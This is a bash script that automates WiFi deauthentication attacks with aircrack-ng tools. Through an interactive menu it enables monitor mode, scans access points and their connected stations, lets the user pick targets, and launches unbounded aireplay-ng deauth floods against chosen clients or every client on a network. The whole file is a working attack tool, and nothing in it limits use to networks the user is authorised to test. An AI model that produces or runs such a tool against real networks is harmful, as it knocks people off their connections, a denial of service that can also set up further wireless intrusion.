#!/bin/bash

# Generate a unique filename based on the current timestamp
timestamp=$(date +%Y%m%d_%H%M%S)
filename_devices="access_points_$timestamp" #for access points in Range
filename_stations="station_$timestamp" #for connected devices (Stations) to a access point

# Function to display available wireless interfaces
function display_interfaces() {
    clear
    echo " Available wireless interfaces:"
    echo -e "\n\033[0;33m Interface\033[0m"
    airmon-ng | awk 'NR>3 && NF!=0 {print " \033[0;33m" NR-3" \033[0m" $2}'
}

# Function to start monitoring mode on a selected interface
function start_monitor_mode() {

    # show current interfaces and ask to select one to start monitor mode
    echo -e "\n\033[0;33m Interface\033[0m"
    airmon-ng | awk 'NR>3 && NF!=0 {print " \033[0;33m" NR-3" \033[0m" $2}'
    interface=($(airmon-ng | awk 'NR>3 && NF!=0 {print $2}'))
    echo -ne "\n Enter the wireless interface to start monitoring mode: "
    read interface_index
    sleep 1
    echo -e " Starting monitoring mode on \033[0;34m${interface[$interface_index-1]}\033[0m..."
    airmon-ng start ${interface[$interface_index-1]}
    clear
}

# Function to stop monitoring mode on a selected interface
function stop_monitor_mode() {

    # show current interfaces and ask to select one to stop monitor mode
    echo -e "\n\033[0;33m Interface\033[0m"
    airmon-ng | awk 'NR>3 && NF!=0 {print " \033[0;33m" NR-3" \033[0m" $2}'
    interface=($(airmon-ng | awk 'NR>3 && NF!=0 {print $2}'))
    echo -ne "\n Enter the wireless interface to stop monitoring mode: "
    read interface_index
    echo -e " Stopping monitoring mode on \033[0;34m${interface[$interface_index-1]}\033[0m"
    airmon-ng stop ${interface[$interface_index-1]}
    clear
}

function search_access_points(){
    # Run airodump-ng to capture access point information
    airodump-ng -w $(pwd)/temp/$filename_devices --output-format csv $interface &
    access_points_caputure_pid=$!
    sleep 5
    # Stop airodump-ng
    kill $access_points_caputure_pid
    sleep 1
    clear
}

# Function to capture access point information
function capture_access_points() {

    ################################################### Get access point info and select one to attack ######################################## 
    
    # show current interfaces and ask to select one for attack
    sleep 1
    clear
    echo -e "\n\033[0;33m Interface\033[0m"
    airmon-ng | awk 'NR>3 && NF!=0 {print " \033[0;33m" NR-3" \033[0m" $2}'
    interface=($(airmon-ng | awk 'NR>3 && NF!=0 {print $2}'))
    echo -ne "\n Enter the wireless interface to start capturing : "
    read interface_index

    # start monitor mode in interface
    echo -e "\n Starting airodump-ng on \033[0;34m${interface[$interface_index-1]}\033[0m..."
    echo -e " Press Ctrl+C to stop capturing.\n\n\n\n"
    sleep 2

    #Creat temp directory is not present
    if [ ! -d "$(pwd)/temp" ]; then
        # Create the directory
        mkdir "$(pwd)/temp"
        echo -e "\n \033[0;34mDirectory created: $(pwd)/temp\033[0m"
        sleep 1
    fi

    while [ true ]
    do
        # Run airodump-ng to capture access point information

        search_access_points;

        # Display all access points in range
        echo -e "    \033[0;33mBSSID\t\tESSID\033[0m"
        awk -F, '/Station/ {exit} NR>2 && (NF-1) {print "\033[0;33m "NR-2 " \033[0m" $1 "  " $(NF-1)}' $(pwd)/temp/$filename_devices-01.csv

    
        # Ask user to select index of access point
        echo -ne "\n\033[0;34m Enter "rerun" to again search for access points\n Select Target: \033[0m"
        read target_index
        
        # check for rerun
        if [ $target_index != "rerun" ]; then
            break
        fi

        # remove previous file while rerun
        rm -rf $(pwd)/temp/$filename_devices-01.csv
    done


    # array of BSSIDs and ESSIDs
    targets=($(awk -F, '/Station/ {exit} NR>2 {print $1}' $(pwd)/temp/$filename_devices-01.csv))
    targets_essid=($(awk -F, '/Station/ {exit} NR>2 {print $(NF-1)}' $(pwd)/temp/$filename_devices-01.csv))

    # Get BSSID and ESSID of selected access point
    bssid=${targets[$target_index-1]}
    essid=${targets_essid[$target_index-1]}

    #Get channel of selected access point 
    bssid_channel=($(awk -F, -v t="$target_index" '/Station/ {exit} NR==(t+2),NF=4 {print $4}' $(pwd)/temp/$filename_devices-01.csv))
    echo -e "\n\033[0;33m $essid $bssid is selected\n\033[0m"
    sleep 2

    ###################################### Get stations info and select to attack ################################################################

    while [ true ]
    do
        # Run airodump-ng to capture specific access point information
        airodump-ng -c $bssid_channel --bssid $bssid -w $(pwd)/temp/$filename_stations --output-format csv $interface &
        stations_capture_pid=$!
        sleep 5

        # Stop airodump-ng
        kill $stations_capture_pid
        sleep 1
        clear

        # Print Startion Mac address
        echo -e "\t\033[0;33m Station MAC\033[0m"
        awk -F, '/Station MAC/ {found=1; next} found && (NF-1) {  print "\033[0;33m   " NR-5 " \033[0m" $1}' $(pwd)/temp/$filename_stations-01.csv
        station_mac=($(awk -F, '/Station MAC/ {found=1; next} found && (NF-1) {  print $1}' $(pwd)/temp/$filename_stations-01.csv))

        # ask for rerun or select clients to deauthenticate
        echo -ne "\n \033[0;34mEnter the index of the client to deauthenticate (or multiple MAC addresses separated by spaces): \n enter rerun to again search for stations \n enter all to deauthenticate all stations : \033[0m"
        read -a clients

        # check for rerun
        if [ $clients != "rerun" ]; then
            break
        fi

        # remove previous file while rerun
        rm -rf $(pwd)/temp/$filename_stations-01.csv
    done

    ####################################### Start deauthentication attack ######################################################

    if [ $clients == "all" ]; then
        # Deauthenticate all stations
        echo -e "\n\n\033[0;31m  Deauthentication attack started on all stations!\n\033[0;30m"
        aireplay-ng --deauth 0 -a $bssid $interface >/dev/null 2>&1 &
    else
        # Deauthenticate selected stations
        echo -ne "\n \033[0;31mattack started on \033[0;30m"
        for client in "${clients[@]}"; do
            echo -ne "\033[0;31m${station_mac[$((client-1))]} \033[0;30m"
            aireplay-ng --deauth 0 -a $bssid -c ${station_mac[$((client-1))]} $interface >/dev/null 2>&1 &
        done
        echo -e "\n\n\033[0;31m  Deauthentication attack started!\n\033[0;30m"
    fi
    
}

function kill_process(){
    # Get pid of airplay-ng process
    pids=($(ps aux | grep "aireplay-ng" | grep -v "grep" | awk '{print $2}'))

    # kill all running aireplay-ng
    if [ -z "$pids" ]; then
        clear
        echo
        echo -e "\033[0;31m No process is already running!!\033[0m"
    else
        clear
        echo
        echo -e "\033[0;31m Stopping all running deauthenticate process.........\033[0m"
        for pid in "${pids[@]}";do
            kill -9 $pid
        done
    fi
}

# Main menu
while true; do
    echo ""
    echo -e "===============\033[0;33m Wireless Interface Management\033[0m ============="
    echo " 1. Display available interfaces"
    echo " 2. Start monitoring mode"
    echo " 3. Stop monitoring mode"
    echo " 4. Capture access points and deauthenticate clients"
    echo " 5. stop all running Deauthentication process"
    echo " 6. Exit"
    echo -e "=============================================================\n"
    echo -n " Please enter your choice: "
    read choice
    echo

    case $choice in
        1) display_interfaces;;
        2) start_monitor_mode;;
        3) stop_monitor_mode;;
        4) capture_access_points;;
        5) kill_process;;
        6) exit;;
        *) echo "Invalid choice";;
    esac
done
